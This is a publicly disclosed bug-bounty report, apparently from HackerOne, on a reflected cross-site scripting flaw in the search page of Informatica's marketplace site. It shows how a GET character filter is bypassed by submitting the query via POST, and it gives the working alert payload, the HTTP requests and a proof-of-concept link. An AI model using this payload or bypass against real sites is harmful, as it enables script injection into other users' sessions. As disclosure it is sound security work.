# [marketplace.informatica.com] Search XSS

## Report Details
- **Report ID**: 200034
- **URL**: https://hackerone.com/reports/200034
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-01-20T21:00:43.260Z
- **Disclosed**: 2017-05-22T04:08:23.983Z

## Reporter
- **Username**: s_p_q_r
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: informatica

## Vulnerability Information
The search query parameter is put into Javascript to set the localStorage item:

https://marketplace.informatica.com/search-solr.jspa?q=%foo%

```javascript
localStorage.setItem("searchTerm", "%foo%");
```

Attempts to inject XSS payloads are blocked by redirection that removes special chars from the URL:

```http
GET /search-solr.jspa?q=aaa%22bbb%27ccc%3Cddd%3Eeee HTTP/1.1
Host: marketplace.informatica.com

HTTP/1.0 302 Found
Location: https://marketplace.informatica.com/search-solr.jspa?q=aaabbbcccdddeee
```

However it turns out the search param can be successfully submitted via POST — the following request popups an alert:

```http
POST /search-solr.jspa HTTP/1.1
Host: marketplace.informatica.com

q=%22-alert%28document.domain%29-%22
```

**PoC:**

http://spqr.zz.mu/info_mp.php?key=066c1cac-b380-4455-9d36-4086dd999dd9

Tested with latest Firefox and Chrome.

## Attachments
No attachments
